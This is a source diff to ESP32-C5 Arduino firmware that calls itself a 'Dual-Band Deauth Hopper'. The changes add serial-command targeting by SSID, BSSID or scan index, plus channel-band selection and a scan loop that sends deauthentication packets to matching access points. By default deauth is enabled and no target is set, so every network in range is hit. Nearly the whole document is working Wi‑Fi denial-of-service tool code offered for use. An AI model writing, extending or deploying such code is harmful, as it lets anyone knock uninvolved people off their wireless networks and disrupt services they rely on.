@@ -8,7 +8,7 @@
        • Red    : Deauth packet sent (short flash)
        • Yellow : MAC history cleared (flash)
        
-   - Tested with Arduino‑ESP32 = 3.3.0-alpha1
+   - Tested with Arduino‑ESP32 = v3.3.0‑alpha1
                Made with love by 7h30th3r0n3
 ---------------------------------------------------------------------------*/
 
@@ -40,6 +40,35 @@ inline void flashLed(uint32_t c, uint16_t t_ms) {
 }
 
 /* ---------------------------------------------------------------------------
+   ---------------------------  Serial Routing  -----------------------------*/
+HardwareSerial SerialUART(1); // UART1 for GPIO 6/7
+
+static void logPrintln() {
+  Serial.println();
+  SerialUART.println();
+}
+
+static void logPrint(const __FlashStringHelper *v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(const String &v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(const char *v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(char v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(int v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(unsigned int v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(long v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(unsigned long v) { Serial.print(v); SerialUART.print(v); }
+static void logPrint(uint8_t v) { Serial.print(v); SerialUART.print(v); }
+
+static void logPrintln(const __FlashStringHelper *v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(const String &v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(const char *v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(char v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(int v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(unsigned int v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(long v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(unsigned long v) { Serial.println(v); SerialUART.println(v); }
+static void logPrintln(uint8_t v) { Serial.println(v); SerialUART.println(v); }
+
+/* ---------------------------------------------------------------------------
    -----------------------------  MAC History  ------------------------------*/
 #define MAC_HISTORY_LEN 1
 struct mac_addr {
@@ -63,7 +92,7 @@ bool already_seen(const uint8_t *mac) {
 void clear_mac_history() {
   memset(mac_history, 0, sizeof(mac_history));
   mac_cursor = 0;
-  Serial.println(F("MAC history cleared."));
+  logPrintln(F("MAC history cleared."));
   flashLed(C_YELLOW, 300);
 }
 
@@ -90,28 +119,65 @@ static const char* security_to_string(wifi_auth_mode_t m) {
 
 /* ---------------------------------------------------------------------------
    ------------------------  Channel List  ---------------------------------*/
-const uint8_t channelList[] = {
-  /*// 2.4 GHz (common worldwide)
-  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11,
-
-  // Extended 2.4 GHz (allowed in some regions, e.g. EU/JP)
-  12, 13, 14,*/
-
-  // 5 GHz UNII-1 (allowed in most regions)
-  36, 40, 44, 48,
-
-  // 5 GHz UNII-2 / UNII-2 Extended (DFS - availability depends on region and DFS support)
-  52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
-
-  // 5 GHz UNII-3 / ISM (commonly allowed in US and many others)
-  149, 153, 157, 161, 165
+const uint8_t channelList2g[] = {
+  1, 2, 3, 4, 5, 6, 7,
+  8, 9, 10, 11, 12, 13
 };
-const size_t CHANNEL_COUNT = sizeof(channelList) / sizeof(channelList[0]);
+
+const uint8_t channelList5g[] = {
+  /* 5 GHz – UNII-1 (NO DFS) */
+  36, 40, 44, 48,
+  /* 5 GHz – UNII-2 (DFS "light") */
+  52, 56, 60, 64,
+  100, 104, 108, 112,
+  /* 5 GHz – UNII-2e (DFS variable) */
+  132, 136, 140
+};
+
+const size_t CHANNEL_2G_COUNT = sizeof(channelList2g) / sizeof(channelList2g[0]);
+const size_t CHANNEL_5G_COUNT = sizeof(channelList5g) / sizeof(channelList5g[0]);
 size_t channelIndex = 0;
 
 /* ---------------------------------------------------------------------------
+   ------------------------  Runtime Config  -------------------------------*/
+const size_t MAX_CHANNELS = 64;
+const size_t MAX_APS = 60;
+const size_t MAX_TARGET_BSSIDS = 16;
+const size_t kMaxSsidLen = 32;
+
+bool scanRunning = true;
+bool deauthEnabled = true;
+bool manualScanPending = false;
+
+uint8_t activeChannels[MAX_CHANNELS] = {};
+size_t activeChannelCount = 0;
+
+bool targetSSIDSet = false;
+bool targetBSSIDSet = false;
+String targetSSID;
+uint8_t targetBSSID[6] = {};
+uint8_t targetBSSIDList[MAX_TARGET_BSSIDS][6] = {};
+size_t targetBSSIDCount = 0;
+
+enum BandMode { BAND_ALL, BAND_2G, BAND_5G };
+BandMode bandMode = BAND_ALL;
+
+struct ApInfo {
+  char ssid[kMaxSsidLen + 1];
+  uint8_t bssid[6];
+  int32_t rssi;
+  uint8_t channel;
+  wifi_auth_mode_t auth;
+};
+
+ApInfo lastScan[MAX_APS] = {};
+size_t lastScanCount = 0;
+unsigned long lastScanMs = 0;
+
+/* ---------------------------------------------------------------------------
    -------------------------------  Timers  ---------------------------------*/
-const unsigned long SCAN_INTERVAL = 200, HISTORY_RESET = 30000;
+unsigned long scanInterval = 200;
+unsigned long historyReset = 30000;
 unsigned long t_lastScan = 0, t_lastClear = 0;
 
 /* ---------------------------------------------------------------------------
@@ -149,62 +215,535 @@ void sendDeauthPacket(const uint8_t *bssid, uint8_t ch) {
 }
 
 /* ---------------------------------------------------------------------------
+   ---------------------------  Serial Helpers  -----------------------------*/
+static String serialLine;
+
+static bool parseMac(const String &s, uint8_t out[6]) {
+  int vals[6] = {0};
+  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
+             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6) {
+    return false;
+  }
+  for (int i = 0; i < 6; ++i) out[i] = (uint8_t)vals[i];
+  return true;
+}
+
+static void resetActiveChannels() {
+  activeChannelCount = 0;
+  channelIndex = 0;
+  if (bandMode == BAND_ALL || bandMode == BAND_2G) {
+    for (size_t i = 0; i < CHANNEL_2G_COUNT && activeChannelCount < MAX_CHANNELS; ++i) {
+      activeChannels[activeChannelCount++] = channelList2g[i];
+    }
+  }
+  if (bandMode == BAND_ALL || bandMode == BAND_5G) {
+    for (size_t i = 0; i < CHANNEL_5G_COUNT && activeChannelCount < MAX_CHANNELS; ++i) {
+      activeChannels[activeChannelCount++] = channelList5g[i];
+    }
+  }
+}
+
+static bool isAllowed2g(uint8_t ch) {
+  for (size_t i = 0; i < CHANNEL_2G_COUNT; ++i)
+    if (channelList2g[i] == ch) return true;
+  return false;
+}
+
+static bool isAllowed5g(uint8_t ch) {
+  for (size_t i = 0; i < CHANNEL_5G_COUNT; ++i)
+    if (channelList5g[i] == ch) return true;
+  return false;
+}
+
+static bool isAllowedChannel(uint8_t ch) {
+  return isAllowed2g(ch) || isAllowed5g(ch);
+}
+
+static bool isAllowedByBand(uint8_t ch) {
+  if (bandMode == BAND_2G) return isAllowed2g(ch);
+  if (bandMode == BAND_5G) return isAllowed5g(ch);
+  return isAllowedChannel(ch);
+}
+
+static void updateBandModeFromActiveChannels() {
+  bool has2g = false;
+  bool has5g = false;
+  for (size_t i = 0; i < activeChannelCount; ++i) {
+    if (activeChannels[i] <= 14) has2g = true;
+    else has5g = true;
+  }
+  if (has2g && has5g) bandMode = BAND_ALL;
+  else if (has2g) bandMode = BAND_2G;
+  else if (has5g) bandMode = BAND_5G;
+}
+
+static bool channelInActive(uint8_t ch) {
+  for (size_t i = 0; i < activeChannelCount; ++i)
+    if (activeChannels[i] == ch) return true;
+  return false;
+}
+
+static void addActiveChannel(uint8_t ch) {
+  if (activeChannelCount >= MAX_CHANNELS) return;
+  if (!isAllowedByBand(ch)) return;
+  if (!channelInActive(ch)) {
+    activeChannels[activeChannelCount++] = ch;
+  }
+}
+
+static void addActiveChannelAny(uint8_t ch) {
+  if (activeChannelCount >= MAX_CHANNELS) return;
+  if (!isAllowedChannel(ch)) return;
+  if (!channelInActive(ch)) {
+    activeChannels[activeChannelCount++] = ch;
+  }
+}
+
+static void addChannelsFromList(const String &list, bool replaceAll) {
+  if (replaceAll) {
+    activeChannelCount = 0;
+    channelIndex = 0;
+  }
+  String tmp = list;
+  tmp.replace(" ", "");
+  while (tmp.length() > 0) {
+    int comma = tmp.indexOf(',');
+    String token = (comma >= 0) ? tmp.substring(0, comma) : tmp;
+    tmp = (comma >= 0) ? tmp.substring(comma + 1) : "";
+    int dash = token.indexOf('-');
+    int startCh = 0, endCh = 0;
+    if (dash >= 0) {
+      startCh = token.substring(0, dash).toInt();
+      endCh = token.substring(dash + 1).toInt();
+    } else {
+      startCh = token.toInt();
+      endCh = startCh;
+    }
+    if (startCh <= 0 || endCh <= 0) continue;
+    if (endCh < startCh) {
+      int t = startCh; startCh = endCh; endCh = t;
+    }
+    for (int ch = startCh; ch <= endCh; ++ch) {
+      addActiveChannel((uint8_t)ch);
+    }
+  }
+  if (activeChannelCount == 0) resetActiveChannels();
+  updateBandModeFromActiveChannels();
+}
+
+static void setChannelsFromLastScanForBssid(const uint8_t *bssid) {
+  if (lastScanCount == 0) return;
+  activeChannelCount = 0;
+  channelIndex = 0;
+  for (size_t i = 0; i < lastScanCount; ++i) {
+    if (memcmp(lastScan[i].bssid, bssid, 6) == 0) {
+      addActiveChannelAny(lastScan[i].channel);
+    }
+  }
+  if (activeChannelCount == 0) return;
+  updateBandModeFromActiveChannels();
+}
+
+static void setChannelsFromLastScanForSsid(const String &ssid) {
+  if (lastScanCount == 0) return;
+  activeChannelCount = 0;
+  channelIndex = 0;
+  for (size_t i = 0; i < lastScanCount; ++i) {
+    if (ssid == lastScan[i].ssid) {
+      addActiveChannelAny(lastScan[i].channel);
+    }
+  }
+  if (activeChannelCount == 0) return;
+  updateBandModeFromActiveChannels();
+}
+
+static bool targetMatch(const String &ssid, const uint8_t *bssid) {
+  if (targetBSSIDCount > 0) {
+    for (size_t i = 0; i < targetBSSIDCount; ++i) {
+      if (memcmp(bssid, targetBSSIDList[i], 6) == 0) return true;
+    }
+    return false;
+  }
+  if (targetSSIDSet && ssid != targetSSID) return false;
+  if (targetBSSIDSet && memcmp(bssid, targetBSSID, 6) != 0) return false;
+  return true;
+}
+
+static void printConfig() {
+  logPrintln(F("=== Config ==="));
+  logPrint(F("scanRunning: ")); logPrintln(scanRunning ? F("ON") : F("OFF"));
+  logPrint(F("deauthEnabled: ")); logPrintln(deauthEnabled ? F("ON") : F("OFF"));
+  logPrint(F("scanInterval(ms): ")); logPrintln(scanInterval);
+  logPrint(F("historyReset(ms): ")); logPrintln(historyReset);
+  logPrint(F("targetSSID: ")); logPrintln(targetSSIDSet ? targetSSID : F("(none)"));
+  logPrint(F("targetBSSID: "));
+  if (targetBSSIDSet) {
+    char buf[18];
+    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
+            targetBSSID[0], targetBSSID[1], targetBSSID[2],
+            targetBSSID[3], targetBSSID[4], targetBSSID[5]);
+    logPrintln(buf);
+  } else {
+    logPrintln(F("(none)"));
+  }
+  logPrint(F("targetBSSID list: "));
+  logPrintln(targetBSSIDCount);
+  logPrint(F("activeChannels("));
+  logPrint(activeChannelCount);
+  logPrint(F("): "));
+  for (size_t i = 0; i < activeChannelCount; ++i) {
+    logPrint(activeChannels[i]);
+    if (i + 1 < activeChannelCount) logPrint(F(","));
+  }
+  logPrintln();
+  logPrintln(F("================"));
+}
+
+static void printHelp() {
+  logPrintln(F("Commands:"));
+  logPrintln(F("  HELP"));
+  logPrintln(F("  START | STOP"));
+  logPrintln(F("  SCAN           (one channel scan, list only)"));
+  logPrintln(F("  SCAN ALL       (fast full scan, list only)"));
+  logPrintln(F("  LIST           (last scan results)"));
+  logPrintln(F("  DEAUTH ON|OFF"));
+  logPrintln(F("  BAND ALL | 2G | 5G"));
+  logPrintln(F("  TARGET SSID <name>"));
+  logPrintln(F("  TARGET BSSID <aa:bb:cc:dd:ee:ff>"));
+  logPrintln(F("  TARGET INDEX <n,m,o>"));
+  logPrintln(F("  TARGET CLEAR"));
+  logPrintln(F("  CHAN SET <list>     (e.g. 1,6,11,36-48)"));
+  logPrintln(F("  CHAN ADD <list>"));
+  logPrintln(F("  CHAN RESET | CHAN CLEAR | CHAN LIST"));
+  logPrintln(F("  INTERVAL <ms>  (scan interval)"));
+  logPrintln(F("  HISTORY <ms>   (MAC history reset)"));
+  logPrintln(F("  CONFIG"));
+}
+
+static void listLastScan() {
+  logPrint(F("Last scan: "));
+  logPrint(lastScanCount);
+  logPrint(F(" AP(s) at "));
+  logPrint(lastScanMs);
+  logPrintln(F(" ms"));
+  logPrintln(F("idx | ch | rssi | auth | bssid | ssid"));
+  for (size_t i = 0; i < lastScanCount; ++i) {
+    const ApInfo &ap = lastScan[i];
+    char buf[18];
+    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
+            ap.bssid[0], ap.bssid[1], ap.bssid[2],
+            ap.bssid[3], ap.bssid[4], ap.bssid[5]);
+    logPrint(i);
+    logPrint(F(" | "));
+    logPrint(ap.channel);
+    logPrint(F(" | "));
+    logPrint(ap.rssi);
+    logPrint(F(" | "));
+    logPrint(security_to_string(ap.auth));
+    logPrint(F(" | "));
+    logPrint(buf);
+    logPrint(F(" | "));
+    logPrintln(ap.ssid);
+  }
+}
+
+static void handleCommand(const String &line) {
+  String cmd = line;
+  cmd.trim();
+  if (cmd.length() == 0) return;
+
+  String upper = cmd;
+  upper.toUpperCase();
+
+  if (upper == "HELP") { printHelp(); return; }
+  if (upper == "START") {
+    scanRunning = true;
+    t_lastClear = millis();
+    logPrintln(F("Scan START"));
+    return;
+  }
+  if (upper == "STOP") {
+    scanRunning = false;
+    logPrintln(F("Scan STOP"));
+    return;
+  }
+  if (upper == "CONFIG") { printConfig(); return; }
+  if (upper == "LIST") { listLastScan(); return; }
+  if (upper == "TARGET CLEAR") {
+    targetSSIDSet = false; targetBSSIDSet = false; targetSSID = "";
+    targetBSSIDCount = 0;
+    logPrintln(F("Targets cleared."));
+    return;
+  }
+  if (upper == "CHAN RESET") { resetActiveChannels(); logPrintln(F("Channels reset.")); return; }
+  if (upper == "CHAN CLEAR") { activeChannelCount = 0; channelIndex = 0; logPrintln(F("Channels cleared.")); return; }
+  if (upper == "CHAN LIST") { printConfig(); return; }
+
+  if (upper == "BAND ALL") {
+    bandMode = BAND_ALL;
+    resetActiveChannels();
+    logPrintln(F("Band mode: ALL"));
+    return;
+  }
+  if (upper == "BAND 2G") {
+    bandMode = BAND_2G;
+    resetActiveChannels();
+    logPrintln(F("Band mode: 2G"));
+    return;
+  }
+  if (upper == "BAND 5G") {
+    bandMode = BAND_5G;
+    resetActiveChannels();
+    logPrintln(F("Band mode: 5G"));
+    return;
+  }
+
+  if (upper.startsWith("DEAUTH ")) {
+    String arg = cmd.substring(7);
+    arg.trim(); arg.toUpperCase();
+    deauthEnabled = (arg == "ON");
+    logPrint(F("Deauth: ")); logPrintln(deauthEnabled ? F("ON") : F("OFF"));
+    return;
+  }
+
+  if (upper.startsWith("INTERVAL ")) {
+    scanInterval = (unsigned long)cmd.substring(9).toInt();
+    logPrintln(F("scanInterval updated."));
+    return;
+  }
+  if (upper.startsWith("HISTORY ")) {
+    historyReset = (unsigned long)cmd.substring(8).toInt();
+    logPrintln(F("historyReset updated."));
+    return;
+  }
+
+  if (upper.startsWith("TARGET SSID ")) {
+    targetSSID = cmd.substring(12);
+    targetSSID.trim();
+    targetSSIDSet = (targetSSID.length() > 0);
+    targetBSSIDCount = 0;
+    targetBSSIDSet = false;
+    logPrint(F("Target SSID: ")); logPrintln(targetSSIDSet ? targetSSID : F("(none)"));
+    if (targetSSIDSet) setChannelsFromLastScanForSsid(targetSSID);
+    return;
+  }
+  if (upper.startsWith("TARGET BSSID ")) {
+    String mac = cmd.substring(13); mac.trim();
+    if (parseMac(mac, targetBSSID)) {
+      targetBSSIDSet = true;
+      targetBSSIDCount = 0;
+      logPrintln(F("Target BSSID set."));
+      setChannelsFromLastScanForBssid(targetBSSID);
+    } else {
+      logPrintln(F("Invalid BSSID format."));
+    }
+    return;
+  }
+  if (upper.startsWith("TARGET INDEX ")) {
+    String list = cmd.substring(13);
+    list.replace(" ", "");
+    targetBSSIDCount = 0;
+    targetSSIDSet = false;
+    targetBSSIDSet = false;
+    activeChannelCount = 0;
+    channelIndex = 0;
+    while (list.length() > 0) {
+      int comma = list.indexOf(',');
+      String token = (comma >= 0) ? list.substring(0, comma) : list;
+      list = (comma >= 0) ? list.substring(comma + 1) : "";
+      int dash = token.indexOf('-');
+      int startIdx = 0, endIdx = 0;
+      if (dash >= 0) {
+        startIdx = token.substring(0, dash).toInt();
+        endIdx = token.substring(dash + 1).toInt();
+      } else {
+        startIdx = token.toInt();
+        endIdx = startIdx;
+      }
+      if (startIdx < 0 || endIdx < 0) continue;
+      if (endIdx < startIdx) {
+        int t = startIdx; startIdx = endIdx; endIdx = t;
+      }
+      for (int idx = startIdx; idx <= endIdx; ++idx) {
+        if (idx < 0 || (size_t)idx >= lastScanCount) continue;
+        const ApInfo &ap = lastScan[idx];
+        if (targetBSSIDCount < MAX_TARGET_BSSIDS) {
+          bool dup = false;
+          for (size_t i = 0; i < targetBSSIDCount; ++i) {
+            if (memcmp(targetBSSIDList[i], ap.bssid, 6) == 0) { dup = true; break; }
+          }
+          if (!dup) {
+            memcpy(targetBSSIDList[targetBSSIDCount++], ap.bssid, 6);
+          }
+        }
+        addActiveChannelAny(ap.channel);
+      }
+    }
+    if (targetBSSIDCount == 0) {
+      logPrintln(F("No valid index selected."));
+    } else {
+      if (activeChannelCount == 0) resetActiveChannels();
+      updateBandModeFromActiveChannels();
+      logPrint(F("Target index set: "));
+      logPrintln(targetBSSIDCount);
+    }
+    return;
+  }
+
+  if (upper.startsWith("CHAN SET ")) {
+    addChannelsFromList(cmd.substring(9), true);
+    logPrintln(F("Channels set."));
+    return;
+  }
+  if (upper.startsWith("CHAN ADD ")) {
+    addChannelsFromList(cmd.substring(9), false);
+    logPrintln(F("Channels added."));
+    return;
+  }
+
+  if (upper == "SCAN") {
+    manualScanPending = true;
+    logPrintln(F("Manual scan requested."));
+    return;
+  }
+  if (upper == "SCAN ALL") {
+    logPrintln(F("Full scan requested."));
+    lastScanCount = 0;
+    lastScanMs = millis();
+    auto fillScan = [&](int n) {
+      if (n <= 0) return;
+      for (int i = 0; i < n && lastScanCount < MAX_APS; ++i) {
+        ApInfo &ap = lastScan[lastScanCount++];
+        memset(ap.ssid, 0, sizeof(ap.ssid));
+        String ssid = WiFi.SSID(i);
+        ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
+        const uint8_t *bssid = WiFi.BSSID(i);
+        memcpy(ap.bssid, bssid, 6);
+        ap.rssi = WiFi.RSSI(i);
+        ap.channel = WiFi.channel(i);
+        ap.auth = WiFi.encryptionType(i);
+      }
+    };
+    if (bandMode == BAND_ALL || bandMode == BAND_2G) {
+      setBandForChannel(1);
+      fillScan(WiFi.scanNetworks(false, true, false, 500, 0));
+    }
+    if (bandMode == BAND_ALL || bandMode == BAND_5G) {
+      setBandForChannel(36);
+      fillScan(WiFi.scanNetworks(false, true, false, 500, 0));
+    }
+    listLastScan();
+    return;
+  }
+
+  logPrintln(F("Unknown command. Type HELP."));
+}
+
+/* ---------------------------------------------------------------------------
+   -----------------------  Scan and Deauth  -------------------------------*/
+static void performScan(bool allowDeauth) {
+  if (activeChannelCount == 0) return;
+  uint8_t ch = activeChannels[channelIndex];
+  setBandForChannel(ch);
+  setLed(C_BLUE);
+  logPrint(F("Scanning channel : "));
+  logPrintln(ch);
+  logPrintln(F("==============================="));
+
+  int n = WiFi.scanNetworks(false, true, false, 500, ch);
+  lastScanCount = 0;
+  lastScanMs = millis();
+
+  if (n > 0) {
+    for (int i = 0; i < n; ++i) {
+      String ssid = WiFi.SSID(i);
+      const uint8_t* bssid = WiFi.BSSID(i);
+      int32_t rssi = WiFi.RSSI(i);
+      wifi_auth_mode_t auth = WiFi.encryptionType(i);
+
+      if (lastScanCount < MAX_APS) {
+        ApInfo &ap = lastScan[lastScanCount++];
+        memset(ap.ssid, 0, sizeof(ap.ssid));
+        ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
+        memcpy(ap.bssid, bssid, 6);
+        ap.rssi = rssi;
+        ap.channel = ch;
+        ap.auth = auth;
+      }
+
+      logPrintln(F("=== Access Point Information ==="));
+      logPrint(F("SSID: ")); logPrintln(ssid);
+      logPrint(F("BSSID (MAC): ")); logPrintln(WiFi.BSSIDstr(i));
+      logPrint(F("Security: ")); logPrintln(security_to_string(auth));
+      logPrint(F("RSSI (Signal Strength): ")); logPrint(rssi); logPrintln(F(" dBm"));
+      logPrint(F("Channel: ")); logPrintln(ch);
+      logPrintln(F("==============================="));
+
+      if (!allowDeauth) continue;
+      if (!targetMatch(ssid, bssid)) continue;
+      if (already_seen(bssid)) {
+        logPrintln(String("We've already sent to ") + WiFi.BSSIDstr(i));
+        continue;
+      }
+      save_mac(bssid);
+      sendDeauthPacket(bssid, ch);
+    }
+  }
+
+  setLed(C_OFF);
+  channelIndex = (channelIndex + 1) % activeChannelCount;
+  t_lastScan = millis();
+}
+
+/* ---------------------------------------------------------------------------
    -------------------------------- Setup -----------------------------------*/
 void setup() {
   Serial.begin(115200);
+  SerialUART.begin(115200, SERIAL_8N1, 6, 7);
   led.begin();
   led.setBrightness(255);
   setLed(C_CYAN);
   WiFi.mode(WIFI_STA);
-  Serial.println(F("ESP32‑C5 Dual‑Band Deauth Hopper ready"));
+  resetActiveChannels();
+  logPrintln(F("ESP32‑C5 Dual‑Band Deauth Hopper ready"));
+  printHelp();
 }
 
 
 /* ---------------------------------------------------------------------------
    -------------------------------- Loop ------------------------------------*/
 void loop() {
-  if (millis() - t_lastClear > HISTORY_RESET) {
+  while (Serial.available()) {
+    char c = (char)Serial.read();
+    if (c == '\n' || c == '\r') {
+      handleCommand(serialLine);
+      serialLine = "";
+    } else {
+      if (serialLine.length() < 200) serialLine += c;
+    }
+  }
+
+  while (SerialUART.available()) {
+    char c = (char)SerialUART.read();
+    if (c == '\n' || c == '\r') {
+      handleCommand(serialLine);
+      serialLine = "";
+    } else {
+      if (serialLine.length() < 200) serialLine += c;
+    }
+  }
+
+  if (scanRunning && (millis() - t_lastClear > historyReset)) {
     clear_mac_history();
     t_lastClear = millis();
   }
 
-  if (millis() - t_lastScan > SCAN_INTERVAL) {
-    uint8_t ch = channelList[channelIndex];
-    setBandForChannel(ch);
-    setLed(C_BLUE);
-    Serial.print(F("Scanning channel : "));
-    Serial.println(ch);
-    Serial.println(F("==============================="));
+  if (manualScanPending) {
+    manualScanPending = false;
+    performScan(false);
+  }
 
-    int n = WiFi.scanNetworks(false, true, false, 500, ch);
-    if (n > 0) {
-      for (int i = 0; i < n; ++i) {
-        const uint8_t* bssid = WiFi.BSSID(i);
-        if (already_seen(bssid)) {
-          Serial.println(String("We've already sent to ") + WiFi.BSSIDstr(i));
-          continue;
-        }
-        String ssid = WiFi.SSID(i);
-        int32_t rssi = WiFi.RSSI(i);
-        const char* sec = security_to_string(WiFi.encryptionType(i));
-
-        Serial.println(F("=== Access Point Information ==="));
-        Serial.print(F("SSID: ")); Serial.println(ssid);
-        Serial.print(F("BSSID (MAC): ")); Serial.println(WiFi.BSSIDstr(i));
-        Serial.print(F("Security: ")); Serial.println(sec);
-        Serial.print(F("RSSI (Signal Strength): ")); Serial.print(rssi); Serial.println(F(" dBm"));
-        Serial.print(F("Channel: ")); Serial.println(ch);
-        Serial.println(F("==============================="));
-
-        save_mac(bssid);
-        sendDeauthPacket(bssid, ch);
-        //delay(200);
-      }
-    }
-
-    setLed(C_OFF);
-    channelIndex = (channelIndex + 1) % CHANNEL_COUNT;
-    t_lastScan = millis();
+  if (scanRunning && (millis() - t_lastScan > scanInterval)) {
+    performScan(deauthEnabled);
   }
 }
-
